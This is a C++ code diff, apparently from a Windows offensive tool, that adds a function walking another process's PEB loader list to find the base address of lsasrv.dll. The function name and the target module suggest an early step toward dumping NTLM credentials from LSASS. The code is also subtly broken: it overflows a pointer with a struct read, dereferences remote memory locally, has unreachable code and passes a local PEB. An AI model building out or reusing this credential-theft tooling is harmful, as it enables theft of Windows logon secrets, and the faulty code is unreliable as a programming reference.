@@ -162,6 +162,38 @@ bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {
 }
 
 
+bool findNTML(HANDLE hTarget, PPEB pPEB, PVOID* pTargetModuleBase) {
+	
+
+	PPEB_LDR_DATA Ldr = pPEB->Ldr;
+
+	PLIST_ENTRY headModule = &Ldr->InMemoryOrderModuleList;
+	PLIST_ENTRY currentModule = headModule->Flink;
+	
+	wchar_t target_module[] = L"C:\\Windows\\System32\\lsasrv.dll";
+
+
+	while (currentModule != headModule) {
+		PLDR_DATA_TABLE_ENTRY LdrDataTableEntry;
+		
+		if (!ReadProcessMemory(hTarget, CONTAINING_RECORD(currentModule, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &LdrDataTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) {
+			printf("Error reading remote LDR entry\n");
+			break;
+			return false;
+		}
+		
+		
+		wprintf(L"Reading %s\n", LdrDataTableEntry->FullDllName.Buffer);
+		if (_wcsicmp(LdrDataTableEntry->FullDllName.Buffer, target_module) == 0) {
+			printf("Found module entry for %S!, Base address: 0x%p, Entrypoint: 0x%p\n", LdrDataTableEntry->FullDllName.Buffer, LdrDataTableEntry->DllBase);
+			*pTargetModuleBase = LdrDataTableEntry->DllBase;
+			return true;
+		}
+		currentModule = currentModule->Flink; // advance to next module
+	}
+	printf("Target module not found or not loaded,..\n");
+	return false;
+}
 
 bool locatePEB(HANDLE hTarget,PPEB* pPEB) {
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
@@ -239,7 +271,9 @@ int main(int argc, wchar_t* argv[]) {
 	}
 	printf("Bytes: %d\n", sBytesTransferred);
 	
-
+	PVOID pLsasrv = NULL;
+	findNTML(hTarget, pLocalPEB, &pLsasrv);
+	printf("LSASRV: 0x%p", pLsasrv);
 
 	std::cout << "Hello world\n";
 
